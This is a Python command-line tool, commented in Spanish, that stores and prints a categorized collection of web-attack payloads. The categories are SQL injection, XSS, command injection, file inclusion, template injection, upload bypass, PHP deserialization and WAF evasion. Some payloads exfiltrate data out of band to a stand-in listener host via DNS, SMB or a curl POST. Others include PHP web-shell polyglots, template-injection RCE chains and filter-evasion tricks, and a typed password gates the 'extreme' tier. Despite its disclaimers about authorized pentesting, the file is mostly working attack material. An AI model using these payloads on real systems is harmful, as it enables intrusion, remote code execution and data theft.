#!/usr/bin/env python3
"""ARSENAL v0.55.0 — dos niveles: BASICO (verde, sin candado) y EXTREMO (rojo, contrasena).

BASICO = lo que todo el mundo hace en un pentest rutinario: va en cajita verde,
 visible siempre, para el lab y para calibrar la superficie del blanco.

EXTREMO = tecnicas avanzadas que requieren criterio y autorizacion: evasion de
 WAF, exfiltracion fuera de banda (OOB), mutation XSS, DOM clobbering, phar://,
 polyglots, bypass de filtros. Contraseña obligatoria + log de cada desbloqueo.

Politica que no cambia: demostracion minima, stop al primer impacto confirmado,
 sin dump masivo, sin persistencia, sin destructivos (DROP/borrado jamas).
Uso CLI:
  python3 core/arsenal.py --list
  python3 core/arsenal.py --cat sql          # nivel BASICO (verde)
  python3 core/arsenal.py --cat sql --extreme  # exige confirmacion escrita ACTIVO
"""
import argparse
import os
import sys

BANNER_WARN = """
=====================================================================
!  MODO EXTREMO: TECNICAS AVANZADAS Y POTENCIALMENTE DESTRUCTIVAS    !
=====================================================================
Lo que vas a usar puede:
  - alterar o destruir datos del blanco
  - ejecutar comandos en el servidor (RCE)
  - exfiltrar datos por canales ocultos (DNS/SMB/out-of-band)

Reglas:
  1. SOLO blancos con programa autorizado que lo permita, O tu lab.
  2. Demostracion minima: stop al primer impacto confirmado.
  3. Sin dump masivo, sin persistencia, sin borrado.
  4. Todo queda registrado para el reporte responsable.
=====================================================================
"""

# entradas: (nombre, payload, nota, nivel)  nivel: "basico" | "extremo"

SQL = [
    ("mysql-sleep", "' OR SLEEP(5)-- -",
     "MySQL: pausa 5s por registro evaluado (el clasico de todos los dias)", "basico"),
    ("union-count", "' UNION SELECT NULL-- -",
     "aumentar NULLs hasta que el count de columnas calza", "basico"),
    ("union-extract", "' UNION SELECT NULL,user(),NULL-- -",
     "version/usuario del motor", "basico"),
    ("comment-inline", "1/**/OR/**/1=1",
     "comentarios intercalados: rompe filtros de espacios", "basico"),
    ("case-bypass", "1 oR 1=1",
     "case-insensitive contra filtros ingenuos", "basico"),
    ("error-extractvalue", "' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
     "ERROR-BASED: los datos salen dentro del mensaje de error XML (MySQL 5.1+)", "extremo"),
    ("oob-dns-exfil", "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),"
     "'.tu-lab.example.net',FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
     "OUT-OF-BAND: exfiltra por DNS aunque la respuesta no se vea; "
     "cambia tu-lab.example.net por TU dominio oyente (interactsh/burp collaborator)", "extremo"),
    ("stacked-pg", "1; SELECT pg_sleep(5)-- -",
     "STACKED QUERIES: segunda consulta en el mismo lote (PostgreSQL/MSSQL)", "extremo"),
    ("union-comment-split", "' UNI/**/ON SELE/**/CT NULL,user()-- -",
     "el WAF no ve la keyword completa, el motor SQL si (rompe reglas regex)", "extremo"),
    ("mysql-version-comment", "' UNION/*!50000 SELECT*/ NULL,version()-- -",
     "comentario de version MySQL: los WAF viejos lo dejan pasar", "extremo"),
    ("json-taint", '"1\\" OR 1=1-- -"',
     "inyeccion DENTRO de un valor JSON (tipico en APIs REST de WordPress): "
     "escapa las comillas del JSON sin romper el formato", "extremo"),
    ("oob-smb-loadfile", "'+(SELECT LOAD_FILE('\\\\\\\\tu-lab.example.net\\\\x'))+'",
     "OUT-OF-BAND Windows: UNC path fuerza conexion SMB al oyente (lector de "
     "hashes; solo lab o autorizacion explicita)", "extremo"),
]

XSS = [
    ("tag-body", "<script>alert(document.domain)</script>",
     "contexto cuerpo HTML sin filtros", "basico"),
    ("attr-quote", '" onmouseover=alert(1) x="',
     "dentro de atributo con comillas", "basico"),
    ("js-string", "'-alert(1)-'",
     "dentro de string JS: cierra y resta", "basico"),
    ("svg-onload", "<svg onload=alert(1)>",
     "tag corto: para CSP sin object-src", "basico"),
    ("autofocus-onfocus", '" autofocus onfocus=alert(1) x="',
     "SE DISPARA SOLO: sin interaccion del usuario (bypass de onmouseover)", "extremo"),
    ("mxss-noscript", '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
     "MUTATION XSS: el navegador re-parsea y el sanitizador dejo pasar lo que "
     "despues se convierte en img ejecutable; rompe filtros DOM", "extremo"),
    ("dom-clobbering", '<a id=x></a><a id=x name=clobbered></a>',
     "DOM CLOBBERING: dos elementos con el mismo id colisionan window.x; "
     "rompe JS que confia en variables globales del DOM", "extremo"),
    ("base-hijack", '<base href="https://tu-lab.example.net/">',
     "HIJACK DE RUTAS: reescribe todas las rutas relativas del sitio hacia "
     "tu servidor (roba scripts/forms)", "extremo"),
    ("unicode-js-context", "\\u003cimg src=x onerror=alert(1)\\u003e",
     "para valores que terminan en JSON.parse/innerHTML: el escape unicode "
     "renace como tag al decodificar", "extremo"),
]

RCE = [
    ("sep-semicolon", "; id",
     "separador clasico tras parametro de comando", "basico"),
    ("sep-pipe", "| id",
     "pipe al siguiente comando", "basico"),
    ("backticks", "`id`",
     "sustitucion inversa", "basico"),
    ("subshell", "$(id)",
     "sustitucion de comando moderna", "basico"),
    ("ifs-bypass", "cat${IFS}/etc/passwd",
     "EVASION: ${IFS} reemplaza el espacio; rompe filtros de comandos con espacios", "extremo"),
    ("wildcard-paths", "/???/??t${IFS}/???/??????",
     "EVASION: comodines camuflaean /bin/cat y /etc/passwd; los filtros de "
     "keywords no matchean nada reconocible", "extremo"),
    ("base64-evasion", "echo${IFS}aWQ7dW5hbWUgLWE=|base64${IFS}-d|sh",
     "EVASION: el comando viaja base64 y se decodifica en vivo; nada "
     "legible para el WAF/IDS", "extremo"),
    ("blind-dns", "$(id | curl -X POST -d @- http://TU-LAB.local/c)",
     "CIEGO: RCE sin salida visible, exfiltra a TU oyente. Nunca a terceros", "extremo"),
]

LFI = [
    ("traversal-basic", "../../../../etc/passwd",
     "path traversal clasico", "basico"),
    ("php-filter", "php://filter/convert.base64-encode/resource=index.php",
     "lee codigo fuente sin ejecutarlo (PHP)", "basico"),
    ("php-filter-chain", "php://filter/convert.iconv.UTF8.CSISO2022KR|"
     "convert.base64-encode|convert.iconv.8859_1.UTF8|convert.iconv.MTF8.UTF8|"
     "convert.iconv.UTF8.UTF7/resource=wp-config.php",
     "FILTER CHAIN: encadena conversiones iconv hasta fabricar contenido "
     "PHP arbitrario = RCE sin upload (PHP < 8.1)", "extremo"),
    ("phar-stream", "phar:///uploads/foto.jpg/x.txt",
     "PHAR: si una funcion de archivo acepta phar://, los metadatos del phar "
     "se DESERIALIZAN solos (pop chain del ecosistema WP)", "extremo"),
    ("path-truncation", "....//....//....//....//....//etc/passwd",
     "TRUNCAMIENTO: ....// reemplaza a ../ cuando el filtro hace un solo "
     "reemplazo por pasada (PHP < 5.3 / configs viejas)", "extremo"),
]

SSTI = [
    ("jinja2-probe", "{{7*7}}",
     "si responde 49 = Jinja2 activo", "basico"),
    ("twig-probe", "{{7*'7'}}",
     "49 = Twig; 7777777 = Jinja2 (identifica el motor)", "basico"),
    ("jinja2-rce-cycler", "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
     "RCE Jinja2: cycler evita filtros de guiones bajos y de 'config'", "extremo"),
    ("jinja2-rce-lipsum", "{{ lipsum.__globals__['os'].popen('id').read() }}",
     "RCE Jinja2: lipsum, segundo camino cuando bloquean cycler/self", "extremo"),
    ("twig-rce-map", "{{['id']|map('system')}}",
     "RCE Twig moderno: map ejecuta system con el item del array", "extremo"),
    ("freemarker", "${7*7}",
     "Java FreeMarker (identifica el motor)", "basico"),
]

UPLOAD = [
    ("double-ext", "shell.php.jpg",
     "parser Apache por extension final en configs viejas", "basico"),
    ("pht-ext", "shell.pht",
     "extensiones ejecutables olvidadas: .pht .php5 .phtml", "basico"),
    ("gif-polyglot", "GIF89a<?php system($_GET['c']); ?>",
     "POLYGLOT: cabecera GIF valida + PHP: pasa validacion de imagen "
     "(getimagesize) y se ejecuta como PHP", "extremo"),
    ("htaccess-armor", "AddType application/x-httpd-php .png",
     "subir .htaccess convierte TODOS los .png del dir en ejecutables "
     "(requiere permitir subida de htaccess)", "extremo"),
    ("svg-xxe", '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM '
     '"file:///etc/passwd">]><svg xmlns="http://www.w3.org/2000/svg">'
     '<text>&xxe;</text></svg>',
     "SVG con XXE: al abrirse en el navegador lector, la entidad lee "
     "archivos locales del servidor (upload de avatar SVG)", "extremo"),
]

DESER = [
    ("inert-proof", 'O:8:"stdClass":0:{}',
     "blanco vivo: demostrar que unserialize acepta input sin efectos", "basico"),
    ("lab-gadget", 'O:9:"LabGadget":1:{s:3:"cmd";s:2:"id";}',
     "SOLO lab: clase LabGadget que nosotros definimos en WP-LAB", "basico"),
    ("phar-popchain", "phar://x.jpg [metadatos con objeto de gadget]",
     "en WP: phar:// en funciones de archivo dispara la pop chain mas "
     "cercana del ecosistema (buscar gadget en el propio plugin)", "extremo"),
]

EVASION = [
    ("comment-inline", "1/**/OR/**/1=1",
     "espacios como comentarios (nivel basico)", "basico"),
    ("url-double", "%2527%2520OR%25201%253D1",
     "doble URL-encode contra un solo decode del WAF", "basico"),
    ("hpp-pollution", "?id=1&id=' UNION SELECT-- -",
     "HTTP PARAMETER POLLUTION: el WAF evalua el primer id, la app usa el "
     "segundo (duplicas el parametro)", "extremo"),
    ("newline-split", "UNION%0aSELECT%0aNULL,user()-- -",
     "%0a (salto de linea) rompe las regex que asumen una sola linea", "extremo"),
    ("unicode-normalize", "%EF%BC%9Cscript%EF%BC%9E",
     "fullwidth ＜script＞: el WAF no lo reconoce, el backend lo normaliza "
     "a <script> (nginx/PHP configs relajadas)", "extremo"),
    ("overlong-utf8", "?p=%C1%BCscript%3Ealert(1)",
     "overlong UTF-8: decoders viejos reinterpreta la secuencia como "
     "caracter ASCII (< = %C1%BC)", "extremo"),
]

CATEGORIES = {
    "sql": ("Inyeccion SQL", SQL),
    "xss": ("Cross-Site Scripting", XSS),
    "rce": ("Ejecucion de comandos", RCE),
    "lfi": ("Inclusion de archivos", LFI),
    "ssti": ("Plantillas del servidor (SSTI)", SSTI),
    "upload": ("Bypass de subidas", UPLOAD),
    "deser": ("Deserializacion PHP", DESER),
    "evasion": ("Evasion de WAF/Filtros", EVASION),
}


def confirm_extreme() -> bool:
    if os.environ.get("ARSENAL_EXTREME") == "1":
        return True
    print(BANNER_WARN)
    print("Para continuar escribe EXACTAMENTE: ACTIVO")
    try:
        return input("> ").strip() == "ACTIVO"
    except EOFError:
        return False


def show(cat: str, extreme: bool) -> None:
    title, entries = CATEGORIES[cat]
    print(f"\n### {title} ###\n")
    shown = 0
    for name, payload, note, nivel in entries:
        if nivel == "extremo" and not extreme:
            print(f"  [{name}] 🔒 EXTREMO (bloqueado)")
            continue
        mark = "🟢" if nivel == "basico" else "💥"
        print(f"  {mark} [{name}]")
        print(f"      {payload}")
        print(f"      uso: {note}\n")
        shown += 1
    if shown:
        print(f"  ({shown} visibles, {len(entries)} total)")


def main():
    ap = argparse.ArgumentParser(description="ARSENAL gateado de CodexRC")
    ap.add_argument("--list", action="store_true", help="inventario por categoria")
    ap.add_argument("--cat", help="categoria a mostrar")
    ap.add_argument("--lab", action="store_true",
                    help="nivel basico sin confirmacion (default)")
    ap.add_argument("--extreme", action="store_true",
                    help="incluye EXTREMO: exige confirmacion escrita")
    args = ap.parse_args()

    if args.list:
        print("ARSENAL v0.55.0 — niveles BASICO (verde) / EXTREMO (rojo):\n")
        for c, (title, entries) in CATEGORIES.items():
            ext = sum(1 for e in entries if e[3] == "extremo")
            bas = len(entries) - ext
            print(f"  {c:8} {title}: {bas} basicos, {ext} extremos")
        print("\nUso: --cat <cat> [--extreme]")
        return 0

    if not args.cat or args.cat not in CATEGORIES:
        print("Categoria invalida. Usa --list")
        return 1

    extreme = False
    if args.extreme:
        if not confirm_extreme():
            print("\n[ARSENAL] Confirmacion rechazada. No se entrega nada.")
            return 2
        extreme = True
    show(args.cat, extreme)
    return 0


if __name__ == "__main__":
    sys.exit(main())
